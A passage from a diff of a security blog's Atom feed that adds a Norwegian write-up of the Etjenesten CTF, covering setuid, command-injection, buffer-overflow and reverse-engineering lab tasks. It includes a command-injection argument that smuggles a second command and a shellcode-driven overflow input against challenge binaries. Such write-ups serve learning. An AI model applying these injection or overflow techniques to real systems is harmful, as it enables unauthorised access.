@@ -1,5 +1,593 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="https://fjank.no/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fjank.no/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-01-09T22:21:47+01:00</updated><id>https://fjank.no/feed.xml</id><title type="html">Fjanks security pages</title><subtitle>A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security. Mostly writeups from results of challenges, war-games, hacking into local vulnerable VM's and similar. I will try to make the writeups as realistic as possible by including all my wrong assumptions and failures. Also I will try to not include code complete walkthroughs, but leave the actual coding as an excercise to the reader.
-</subtitle><author><name>Fjank</name></author><entry><title type="html">NPST utlyser en midlertidig stilling som snikende alvebetjent</title><link href="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/" rel="alternate" type="text/html" title="NPST utlyser en midlertidig stilling som snikende alvebetjent" /><published>2020-01-04T00:00:00+01:00</published><updated>2020-01-04T00:00:00+01:00</updated><id>https://fjank.no/blog/pst-chistmas-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="https://fjank.no/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fjank.no/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-04-08T20:05:35+02:00</updated><id>https://fjank.no/feed.xml</id><title type="html">Fjanks security pages</title><subtitle>A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security. Mostly writeups from results of challenges, war-games, hacking into local vulnerable VM's and similar. I will try to make the writeups as realistic as possible by including all my wrong assumptions and failures. Also I will try to not include code complete walkthroughs, but leave the actual coding as an excercise to the reader.
+</subtitle><author><name>Fjank</name></author><entry><title type="html">Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet</title><link href="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" rel="alternate" type="text/html" title="Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet" /><published>2020-03-06T00:00:00+01:00</published><updated>2020-03-06T00:00:00+01:00</updated><id>https://fjank.no/blog/etjenesten-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-03-06-etjenesten-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduksjon&quot; id=&quot;markdown-toc-introduksjon&quot;&gt;Introduksjon&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#grunnleggende&quot; id=&quot;markdown-toc-grunnleggende&quot;&gt;Grunnleggende&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-hvordan-virker-det&quot; id=&quot;markdown-toc-1-hvordan-virker-det&quot;&gt;1. Hvordan virker det.&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-setuid-basic&quot; id=&quot;markdown-toc-2-setuid-basic&quot;&gt;2. Setuid basic&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-basic-injection&quot; id=&quot;markdown-toc-3-basic-injection&quot;&gt;3. Basic injection&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-basic-buffer-overflow&quot; id=&quot;markdown-toc-4-basic-buffer-overflow&quot;&gt;4. Basic buffer overflow&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#5-basic-reverse-engineering&quot; id=&quot;markdown-toc-5-basic-reverse-engineering&quot;&gt;5. Basic reverse engineering&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#hjernetrim&quot; id=&quot;markdown-toc-hjernetrim&quot;&gt;Hjernetrim&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#lett---clmystery&quot; id=&quot;markdown-toc-lett---clmystery&quot;&gt;Lett - clmystery&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#knock-knock&quot; id=&quot;markdown-toc-knock-knock&quot;&gt;Knock knock&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#lett---runer&quot; id=&quot;markdown-toc-lett---runer&quot;&gt;Lett - runer&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#lett---sharing-secrets&quot; id=&quot;markdown-toc-lett---sharing-secrets&quot;&gt;Lett - Sharing secrets&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#middels---artwork&quot; id=&quot;markdown-toc-middels---artwork&quot;&gt;Middels - Artwork&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#middels---explosion&quot; id=&quot;markdown-toc-middels---explosion&quot;&gt;Middels - Explosion&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#selve-oppdraget&quot; id=&quot;markdown-toc-selve-oppdraget&quot;&gt;Selve Oppdraget&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#situasjon&quot; id=&quot;markdown-toc-situasjon&quot;&gt;Situasjon&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#oppdrag&quot; id=&quot;markdown-toc-oppdrag&quot;&gt;Oppdrag&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#sql-injection&quot; id=&quot;markdown-toc-sql-injection&quot;&gt;SQL injection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#whats-next&quot; id=&quot;markdown-toc-whats-next&quot;&gt;Whats next?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#til-slutt&quot; id=&quot;markdown-toc-til-slutt&quot;&gt;Til slutt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;introduksjon&quot;&gt;Introduksjon&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2020-etjenesten/E-Cyberops-Landingsside-banner.jpg&quot; alt=&quot;Banner for cybertalent CTF&quot; /&gt;
+Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020.
+&lt;a href=&quot;https://forsvaret.no/fokus&quot;&gt;Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge&lt;/a&gt;
+På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for.
+Ved å gå til &lt;a href=&quot;https://ctf.cybertalent.no/&quot;&gt;https://ctf.cybertalent.no/&lt;/a&gt; så kunne man registrere seg og etterhvert delta på konkurransen.
+Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien.
+Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne
+noen dokumenter, litt historie, og de faktiske oppgavene.
+Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag.
+La oss hoppe i det!&lt;/p&gt;
+
+&lt;h2 id=&quot;grunnleggende&quot;&gt;Grunnleggende&lt;/h2&gt;
+&lt;h3 id=&quot;1-hvordan-virker-det&quot;&gt;1. Hvordan virker det.&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En kort forkaring over hvordan systemet virker og hvordan man kan registrere flagg man finner.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Her er det veldig grunnleggende, oppsett av scoreboard og hvordan registrere flagg.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scoreboard &lt;span class=&quot;nt&quot;&gt;--set-name&lt;/span&gt; fjank
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;FLAGG
+scoreboard FLAGG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;2-setuid-basic&quot;&gt;2. Setuid basic&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En forklaring av hvordan setuid fungerer
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interessant, å bli introdusert for &lt;a href=&quot;https://en.wikipedia.org/wiki/Setuid&quot;&gt;setuid programmer&lt;/a&gt; som grunnleggende. 
+Dette kan bli interessant. Setuid programmet ligger i samme katalog som vi står i, så det er bare å referere
+til current katalog for å kjøre korrekt program.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./cat FLAGG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;3-basic-injection&quot;&gt;3. Basic injection&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En forklaring av hvordan command injection fungerer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basic &lt;a href=&quot;https://owasp.org/www-community/attacks/Command_Injection&quot;&gt;command injection&lt;/a&gt; løser denne enkelt.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./md5sum &lt;span class=&quot;s2&quot;&gt;&quot;FLAGG;cat FLAGG&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;4-basic-buffer-overflow&quot;&gt;4. Basic buffer overflow&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En forklaring av hvordan en basic buffer overflow fungerer.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En svært enkelt buffer overflow med masse hjelp, man blir holdt i hånden hele veien.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;overflow.c
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;sample_shellcode&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+/overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHabcdefghabcdefghabcdefgh000000
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;FLAGG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;5-basic-reverse-engineering&quot;&gt;5. Basic reverse engineering&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En grunnleggende introduksjon til reverse engineering.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Denne er også veldig basic, vi får et program og skal finne et passord. &lt;a href=&quot;https://ghidra-sre.org/&quot;&gt;Ghidra&lt;/a&gt; hjelper oss til å finne metoden
+check_password, som med litt statisk analyse lett gir oss passordet “Reverse_engineering_er_morsomt__”.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reverse_engineering&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;local_c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f72655f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'m'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;local_d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;hjernetrim&quot;&gt;Hjernetrim&lt;/h2&gt;
+&lt;h3 id=&quot;lett---clmystery&quot;&gt;Lett - clmystery&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Her er det litt kjøreregler, man må finne en mistenkt, aller helst kun ved hjelp av command line.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Jo flinkere man er til kommandolinje, jo lettere blir denne. Vi begynner med å finne alle CLUE i crimescene.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;CLUE crimescene
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CLUE: Footage from an ATM security camera is blurry but shows that the perpetrator is a tall male, at least 6'.
+CLUE: Found a wallet believed to belong to the killer: no ID, just loose change, and membership cards for AAA, Delta SkyMiles, the local library, and the Museum of Bash History. The cards are totally untraceable and have no name, for some reason.
+CLUE: Questioned the barista at the local coffee shop. He said a woman left right before they heard the shots. The name on her latte was Annabel, she had blond spiky hair and a New Zealand accent.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La oss sjekke det siste hintet:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Annabel people
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Annabel Sun     F       26      Hart Place, line 40
+Annabel Church  F       38      Buckingham Place, line 179
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La oss sjekke Annabel Sun først&lt;/p&gt;
